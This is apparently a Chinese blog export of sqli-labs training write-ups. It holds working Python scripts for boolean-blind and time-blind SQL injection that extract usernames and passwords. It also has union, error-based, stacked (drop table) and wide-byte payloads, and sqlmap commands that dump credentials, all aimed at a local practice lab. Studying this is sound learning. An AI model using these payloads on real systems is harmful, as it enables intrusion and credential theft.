<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">Over=<span class="string">&quot; -- &quot;</span></span><br><span class="line">Right=<span class="string">b&quot;You are in&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://localhost/sqli-labs/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">Verifystring=<span class="string">&quot; and left(%s,%d)=&#x27;%s&#x27;&quot;</span></span><br><span class="line">VerifyLength=<span class="string">&quot; and length(concat(%s,&#x27;1&#x27;))=%d&quot;</span></span><br><span class="line">UserName=<span class="string">&quot;(select username from users limit %d,1)&quot;</span></span><br><span class="line">Password=<span class="string">&quot;(select password from users limit %d,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Number</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=<span class="string">&quot; and concat((select count(*) from users))=%d -- &quot;</span>%i</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_UserName</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_Password</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_UserName</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Password</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Respond=urllib.request.urlopen(FinalUrl)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.read():</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Get_Number()):</span><br><span class="line">    IDL=GetLength_UserName(i)</span><br><span class="line">    PWL=GetLength_Password(i)</span><br><span class="line">    IDS=Get_UserName(i,IDL)</span><br><span class="line">    PWS=Get_Password(i,PWL)</span><br><span class="line">    print(IDS,<span class="string">&#x27;:&#x27;</span>,PWS)    </span><br></pre></td></tr></table></figure>
<p>下面是本地输出的数据：<br><img src="https://xorex.space/image/131.png" alt="image.png"></p>
<ul>
<li><strong>Less-9</strong></li>
</ul>
<p>时间盲注，把上一题的脚本改一改就可以用了，从判断”You are in”更改为判断返回的时间。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">Over=<span class="string">&quot; -- &quot;</span></span><br><span class="line">url=<span class="string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line">Verifystring=<span class="string">&quot; and if(left(%s,%d)=&#x27;%s&#x27;,sleep(0.1),1)&quot;</span></span><br><span class="line">VerifyLength=<span class="string">&quot; and if(length(concat(%s,&#x27;1&#x27;))=%d,sleep(0.1),1)&quot;</span></span><br><span class="line">UserName=<span class="string">&quot;(select username from users limit %d,1)&quot;</span></span><br><span class="line">Password=<span class="string">&quot;(select password from users limit %d,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Number</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        LastUrl=<span class="string">&quot; and if(concat((select count(*) from users))=%d,sleep(0.1),1) -- &quot;</span>%i</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Start=time.time()</span><br><span class="line">        urllib.request.urlopen(FinalUrl)</span><br><span class="line">        End=time.time()</span><br><span class="line">        <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_UserName</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Start=time.time()</span><br><span class="line">        urllib.request.urlopen(FinalUrl)</span><br><span class="line">        End=time.time()</span><br><span class="line">        <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_Password</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        LastUrl=VerifyLength%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">        Start=time.time()</span><br><span class="line">        urllib.request.urlopen(FinalUrl)</span><br><span class="line">        End=time.time()</span><br><span class="line">        <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_UserName</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Start=time.time()</span><br><span class="line">            urllib.request.urlopen(FinalUrl)</span><br><span class="line">            End=time.time()</span><br><span class="line">            <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Password</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            LastUrl=Verifystring%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)))+Over</span><br><span class="line">            FinalUrl=url+urllib.request.quote(LastUrl)</span><br><span class="line">            Start=time.time()</span><br><span class="line">            urllib.request.urlopen(FinalUrl)</span><br><span class="line">            End=time.time()</span><br><span class="line">            <span class="keyword">if</span> (End-Start)&gt;<span class="number">0.1</span> <span class="keyword">and</span> (End-Start)&lt;<span class="number">0.2</span>:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Get_Number()):</span><br><span class="line">    IDL=GetLength_UserName(i)</span><br><span class="line">    PWL=GetLength_Password(i)</span><br><span class="line">    IDS=Get_UserName(i,IDL)</span><br><span class="line">    PWS=Get_Password(i,PWL)</span><br><span class="line">    print(IDS,<span class="string">&#x27;:&#x27;</span>,PWS)</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/132.png" alt="image.png"></p>
<ul>
<li><strong>Less-11</strong></li>
</ul>
<p>简单的Post注入，方法和前几道题目差不多。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">uname=-1&#x27; union select (select group_concat(username) from users),(select group_concat(username) from users) -- &amp;passwd=Dumb&amp;sumbit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/134.png" alt="image.png"></p>
<ul>
<li><strong>Less-14</strong></li>
</ul>
<p>报错盲注，只需要修改Limit后面的参数就可以获得所有数据了。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">uname=Dumb&quot; and updatexml(&#x27;error&#x27;,concat(&#x27;~&#x27;,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1)),&quot;error&quot;) -- &amp;passwd=Dumb&amp;sumbit=Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/135.png" alt="image.png"></p>
<ul>
<li><strong>Less-15(用基于布尔的盲注)</strong></li>
</ul>
<p>这里和第八题的方法是一样的，唯一的不同就是构造Get和Post的区别，然后还是写个脚本就跑出了所有的数据了，不得不说Python功能性还是比C++要强很多的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Over=<span class="string">&quot; -- &quot;</span></span><br><span class="line">Right=<span class="string">&quot;flag.jpg&quot;</span></span><br><span class="line">URL=<span class="string">&quot;http://localhost/sqli-labs/Less-15/&quot;</span></span><br><span class="line">Data=&#123;<span class="string">&#x27;uname&#x27;</span>:<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;Dumb&#x27;</span>,<span class="string">&#x27;sumbit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">Verifystring=<span class="string">&quot;Dumb&#x27; and left(%s,%d)=&#x27;%s&#x27;&quot;</span></span><br><span class="line">VerifyLength=<span class="string">&quot;Dumb&#x27; and length(concat(%s,&#x27;1&#x27;))=%d&quot;</span></span><br><span class="line">UserName=<span class="string">&quot;(select username from users limit %d,1)&quot;</span></span><br><span class="line">Password=<span class="string">&quot;(select password from users limit %d,1)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Number</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        Data[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;Dumb&#x27; and concat((select count(*) from users))=%d -- &quot;</span>%i</span><br><span class="line">        Respond=requests.post(url=URL,data=Data)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_UserName</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        Data[<span class="string">&#x27;uname&#x27;</span>]=VerifyLength%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        Respond=requests.post(url=URL,data=Data)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetLength_Password</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        Data[<span class="string">&#x27;uname&#x27;</span>]=VerifyLength%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>)+Over</span><br><span class="line">        Respond=requests.post(url=URL,data=Data)</span><br><span class="line">        <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_UserName</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            Data[<span class="string">&#x27;uname&#x27;</span>]=Verifystring%(UserName%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)))+Over</span><br><span class="line">            Respond=requests.post(url=URL,data=Data)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">48</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try                           </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Get_Password</span>(<span class="params"><span class="built_in">id</span>,<span class="built_in">len</span></span>):</span></span><br><span class="line">    Try=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>):</span><br><span class="line">            Data[<span class="string">&#x27;uname&#x27;</span>]=Verifystring%(Password%<span class="built_in">id</span>,i+<span class="number">1</span>,(Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)))+Over</span><br><span class="line">            Respond=requests.post(url=URL,data=Data)</span><br><span class="line">            <span class="keyword">if</span> Right <span class="keyword">in</span> Respond.text:</span><br><span class="line">                Try=Try+<span class="built_in">chr</span>(j+<span class="number">33</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> Try  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Get_Number()):</span><br><span class="line">    IDL=GetLength_UserName(i)</span><br><span class="line">    PWL=GetLength_Password(i)</span><br><span class="line">    IDS=Get_UserName(i,IDL)</span><br><span class="line">    PWS=Get_Password(i,PWL)</span><br><span class="line">    print(IDS,<span class="string">&#x27;:&#x27;</span>,PWS)</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/136.png" alt="image.png"></p>
<ul>
<li><strong>Less-18</strong></li>
</ul>
<p>只要修改limit范围就可以得到所有的数据。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User-Agent: &#x27; and updatexml(1,concat(0x7e,(select concat(username,&#x27;:&#x27;,password) from users limit 0,1)),1) and &#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/137.png" alt="image.png"></p>
<ul>
<li><strong>Less-38</strong></li>
</ul>
<p>堆叠注入，就建立一个表然后再删除吧。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-38/?id=1%27;%20create%20table%20new%20like%20users%20--%20</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-38/?id=1%27;%20drop%20table%20new%20--%20</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><strong>结合所学知识,尝试用自己的语言来描述如何防范/修复sql注入?</strong></li>
</ol>
<ul>
<li>过滤关键词，防范各种可能的注入。</li>
<li>预编译SQL语句，比如参数化查询。</li>
</ul>
<h2 id="提升："><a href="#提升：" class="headerlink" title="提升："></a>提升：</h2><ul>
<li><strong>了解github并创建属于自己的账号(很多东西我们都能在github上找到,如sqli-labs,sqlmap等)</strong></li>
</ul>
<p>已经创建了：<a href="https://github.com/Administrator-Xorex">https://github.com/Administrator-Xorex</a></p>
<ul>
<li><strong>了解sqlmap,尝试使用此工具对sqli-labs靶场中的Less-1,Less-5进行攻击,并了解sqlmap中关于tamper有关的知识</strong></li>
</ul>
<ol>
<li><strong>Less-1:</strong></li>
</ol>
<p>首先使用sqlmap对less-1进行扫描，发现了可以进行四种注入：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> -<span class="literal">-banner</span></span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/138.png" alt="image.png"></p>
<p>然后就可以一步一步获得数据了：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> -<span class="literal">-dbs</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> <span class="literal">-D</span> security -<span class="literal">-tables</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users -<span class="literal">-columns</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://localhost/sqli-labs/less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">-C</span> username,password -<span class="literal">-dump</span></span><br></pre></td></tr></table></figure>
<p>最后成功获得数据并保存：</p>
<p><img src="https://xorex.space/image/139.png" alt="image.png"></p>
<ol start="2">
<li><strong>Less-5:</strong></li>
</ol>
<p>和上面的Less-1过程相同，不过这次测出来的注入就少了联合查询，最后也能搞到数据。</p>
<p><img src="https://xorex.space/image/140.png" alt="image.png"></p>
<ol start="3">
<li><strong>Tamper</strong></li>
</ol>
<p>可以一定程度上绕过的字符过滤，WAF规则的阻挡，从而进行攻击。</p>
<ul>
<li><strong>了解sql注入的过滤及绕过,尝试完成Less-33,Less-36</strong></li>
</ul>
<ol>
<li><strong>Less-33:</strong></li>
</ol>
<p>宽字符注入，因为这道题将输入的’加了一个反斜杠，只需要用宽字符吃掉这个反斜杠即可形成闭合：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-33/?id=0%df%27%20union%20select%201,(select%20group_concat(username)%20from%20users),(select%20group_concat(password)%20from%20users)%23</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/141.png" alt="image.png"></p>
<ol start="2">
<li><strong>Less-36:</strong></li>
</ol>
<p>这个和33是一样的，都是宽字节注入。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-36/?id=0%ee%27%20union%20select%201,(select%20group_concat(username)%20from%20users),(select%20group_concat(password)%20from%20users)%23</span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/142.png" alt="image.png"></p>
<ul>
<li><p><strong>尝试阅读sqli-labs中的源码(需PHP要有一定的PHP功底,接下来会学习),结合所学知识从代码角度分析sql注入产生的原因</strong></p>
</li>
<li><p>正在尝试学习PHP中……</p>
</li>
</ul>
<h2 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h2><ul>
<li><strong>感谢学长们的Web学习计划第二期！！！</strong></li>
<li><strong>配环境好麻烦啊，尤其是不知道哪里出问题的那种 QAQ</strong></li>
</ul>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>报告</tag>
      </tags>
  </entry>
  <entry>
    <title>Sql-libs注入WriteUp</title>
    <url>/2020/09/29/a0feb4d574d4/</url>
    <content><![CDATA[<h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><blockquote>
<p>这是一个印度小哥写的SQL注入漏洞复现的实验平台，用来练习一些基本的SQL注入技巧。在Github上面可以自由下载，搭建过相关的环境之后就可以使用了。</p>
</blockquote>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>进来之后的页面显示让你输入一个值。</p>
<p><img src="https://xorex.space/image/158.png" alt="image-20201003204150484"></p>
<p>url中get让id=1之后返回了一个账号的名字和密码。猜测这里直接用了ID加入了SQL查询的语言，然后返回SQL查询之后的结果显示。</p>
<p><img src="https://xorex.space/image/159.png" alt="image-20201003204224823"></p>
<p>这个负责构造时传入ID值的变量可能是需要闭合的，比如这个变量可能会用 <code>&#39;&#39; &quot;&quot; (&quot;&quot;) (&#39;&#39;)</code> 这一类的符号把这个变量给闭合，当然也有可能什么都不加入，也就是不构造闭合。</p>
<p>那么我们需要确定这是哪一种情况方法很简单，就是在Get传入参数的时候，后面加入对应的符号，如果使用 <code>&quot;&quot;</code> 来闭合，那么我们后面加上 <code>&#39;</code> 符号就不会报错，如果加入 <code>&quot;</code> 符号就会报错， 也就是 <code>&#39;id=$id&quot;&#39;</code> 没问题，但是 <code>&quot;id=$id&quot;&quot;</code> 就会有问题，因为这里多出了一个 <code>&quot;</code> 这个符号使得双引号无法闭合，所以就会报错。</p>
<p><img src="https://xorex.space/image/160.png" alt="image-20201003204309534"></p>
<p>通过尝试，我们发现是通过单引号闭合的，因为加入 <code>&quot;</code> 和其他符号是没有问题，但是加入单引号 <code>&#39;</code> 就会报错，说明这个负责存储ID的值的变量是通过单引号闭合。</p>
<p>好了，那么现在我们就可以往里面注入一些其他的命令了。我们的目标是一次性拿到所有的账号名和密码！</p>
<p>上面输出的账号密码肯定是那个SQL表单里面的某两列的数据，我们现在需要确定到底是哪两列，使用的方法就是联合查询，也就是 <code>union</code> 语句，这个是用来合并两个查询语句的数据然后再输出的，但是我们可以利用它将题目代码不输出（让ID=-1，因为没有ID=-1的数据，那么它就不会输出），而后面我们联合查询的数据却可以输出，这样我们就可以看到我们想要的数据了。我们最后需要加入注释符 <code>--</code> 这样可以注释掉后面它本身的SQL语句，不干扰我们注入的语句的执行。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2 --</span></span><br></pre></td></tr></table></figure>
<p>根据联合查询 union 的特性，需要查询的表单的列数量是一样多的才行，那么我们就可以一个一个尝试，上面的<code>select 1,2</code> 就是测试保存账号密码的表单是否只有两列，发现报错，说明不是两列。</p>
<p>然后再加数字：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --</span></span><br></pre></td></tr></table></figure>
<p>这次成功了：</p>
<p><img src="https://xorex.space/image/161.png" alt="image-20201003205626333"></p>
<p>在账号名这里输出了2，在密码这里输出了3，说明用户名保存在表单的第二列，而密码保存在表单的第三列。通过上面的联合查询，我们就可以在第二列通道和第三列通道里面通过我们精心构造的SQL语句输出我们想要的数据了。</p>
<p>我们想要在一行输出所有的账号或者密码，就需要使用 group_concat()函数，作用是将分到一组的数据变成一行字符串，所以我们就可以把所有的用户名变成一行字符串，所有的密码变成一行字符串。</p>
<p>我们首先需要用database()来知道当前这个表单所在的数据库的名字，放到第二通道或者第三通道任意一个输出即可。</p>
<p><img src="https://xorex.space/image/162.png" alt="image-20201003210340389"></p>
<p>发现现在所在的数据库叫作 <code>security</code> ，然后我们就可以通过information_schema 这个库里面存储着整个数据库所有的信息，来定位存储着账号密码的表单的名称以及账号列和密码列的列名了。</p>
<p>首先这个库里面保存数据库的表单的信息是 <code>tables</code> 这个库，里面 <code>table_schema</code> 这一列里面存储着某一个表单所属的数据库的名称，然后我们就可以通过查询这个库并且筛选所属数据库名称来确定 <code>security</code> 这个库里面的所有表单的名字了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/163.png" alt="image-20201003211807055"></p>
<p>这想想就知道肯定在 users 这个表单里面了啊，剩下的就好办了，下一步就是获取users表单里面的列名。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
<p><img src="https://xorex.space/image/164.png" alt="image-20201003212501659"></p>
<p>好的，现在我们已经成功的拿到了列名，显然我们比较关注的是 <code>username</code> 和 <code>password</code> 两个列，那么我们就让他们分别在2、3通道里面显示吧。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username),group_concat(password) from users --</span></span><br></pre></td></tr></table></figure>
<p>然后就成功拿到了所有的数据：</p>
<p><img src="https://xorex.space/image/165.png" alt="image-20201003213006957"></p>
<blockquote>
<p>大概就写一下第一关的思路，用来快速上手以应对遗忘。</p>
</blockquote>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>emmmm，对了，还有几种报错注入的方式也记录下来。</p>
<h3 id="group-by-语句报错"><a href="#group-by-语句报错" class="headerlink" title="group by 语句报错"></a>group by 语句报错</h3><p>这里面最复杂的就是利用group by语句执行的时候的一些特性，来构造一个错误语句，从而在返回错误信息的同时，返回我们想要的数据。</p>
<p>这样的结构是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat((<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br><span class="line"><span class="keyword">as</span> A <span class="keyword">from</span> information_schema.table <span class="keyword">group</span> <span class="keyword">by</span> A;</span><br></pre></td></tr></table></figure>
<p>这里利用的是在执行group by 语句的时候，会生成一个动态的表，这个动态的表就是合并数据的过程，首先会先读入一行数据，然后查看动态表中是否用这个数据，如果有了，那么久合并，如果没有，那么就插入。</p>
